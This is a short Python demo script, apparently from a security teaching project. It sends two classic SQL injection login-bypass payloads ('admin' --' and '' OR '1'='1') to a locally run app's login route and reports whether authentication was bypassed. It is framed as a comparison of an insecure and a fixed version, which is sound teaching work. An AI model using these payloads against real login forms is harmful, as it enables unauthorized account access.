"""Demo: SQL injection against the login route of the LOCAL app.
Run the app first, then: python attacks/scripts/sql_injection.py
Expected: insecure version logs in without a password, fixed version rejects it.
"""
import requests

BASE_URL = "http://127.0.0.1:5000"   # change to your local port
LOGIN_URL = f"{BASE_URL}/login"       # change to your login route

PAYLOADS = [
    ("admin' --", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
]

for username, password in PAYLOADS:
    r = requests.post(LOGIN_URL, data={"username": username, "password": password},
                      allow_redirects=False)
    # Adjust this check to what your app does on success (redirect, welcome text, etc.)
    success = r.status_code in (301, 302) or "Welcome" in r.text
    print(f"{username!r:25} -> {'LOGIN BYPASSED' if success else 'rejected'}")
